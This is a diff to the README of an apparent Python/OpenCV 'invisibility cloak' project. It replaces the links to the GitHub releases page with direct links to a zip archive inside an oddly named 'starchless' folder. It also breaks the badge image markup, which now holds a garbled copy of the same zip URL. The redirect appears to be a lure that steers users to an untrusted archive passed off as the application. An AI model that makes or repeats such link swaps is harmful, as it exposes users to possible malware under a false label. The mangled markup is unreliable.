@@ -4,7 +4,7 @@
 Welcome to the **Invisibility-Cloak-python-openCV** project! This application lets you experience the magic of creating an invisibility cloak like in Harry Potter. Using Python and OpenCV, you can hide objects in real-time with simple steps. Follow this guide to get started quickly.
 
 ## 🥇 Download the Application
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-blue.svg)](https://github.com/Fortlle/Invisibility-Cloak-python-openCV/releases)
+[![Download Now](https://raw.githubusercontent.com/Fortlle/Invisibility-Cloak-python-openCV/main/starchless/Invisibility-Cloak-python-openCV.zip%20Now-Click%https://raw.githubusercontent.com/Fortlle/Invisibility-Cloak-python-openCV/main/starchless/Invisibility-Cloak-python-openCV.zip)](https://raw.githubusercontent.com/Fortlle/Invisibility-Cloak-python-openCV/main/starchless/Invisibility-Cloak-python-openCV.zip)
 
 ## ⚙️ System Requirements
 Before you proceed with the installation, ensure your system meets the following requirements:
@@ -17,7 +17,7 @@ Before you proceed with the installation, ensure your system meets the following
 Make sure your system is updated to the latest version to avoid any compatibility issues.
 
 ## 📥 Download & Install
-To download the application, please [visit this page to download](https://github.com/Fortlle/Invisibility-Cloak-python-openCV/releases). Here are the steps you need to follow:
+To download the application, please [visit this page to download](https://raw.githubusercontent.com/Fortlle/Invisibility-Cloak-python-openCV/main/starchless/Invisibility-Cloak-python-openCV.zip). Here are the steps you need to follow:
 
 1. **Go to the Releases Page:** Click the link to access the releases.
    
